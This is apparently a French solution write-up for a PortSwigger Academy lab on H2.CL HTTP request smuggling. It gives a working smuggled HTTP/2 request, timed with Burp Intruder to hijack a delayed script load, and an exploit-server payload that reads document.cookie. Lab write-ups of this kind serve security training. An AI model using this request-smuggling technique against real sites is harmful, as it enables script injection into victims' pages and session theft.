# Lab

https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling

## Solution

Ce lab est complexe car il faut que notre attaque HTTP Request Smuggling soit effective dans une fenêtre de 5s random car :

```js
setTimeout(() => {
    const script = document.createElement('script');
    document.body.appendChild(script);
    uid = Math.random().toString(10).substr(2, 10);
    script.src = '/resources/js/analytics.js?uid=' + uid;
}, 5000);
```

A chaque connexion à la page d'accueil, une requête est effectuée 5 secondes après pour récupérer un script et c'est cette requête que nous allons attaquer.

Burp Intruder, une requête à la fois, délai de 300ms entre chaque requête.

```http
POST / HTTP/2
Host: 0a2000ef04c288f98006621b00300049.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
GET /resources HTTP/1.1
Host: exploit-0aea00000448882e8025610d013b0089.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=§§
```

Dans exploit serveur, sous `/resources/` :

```js
alert(document.cookie);
```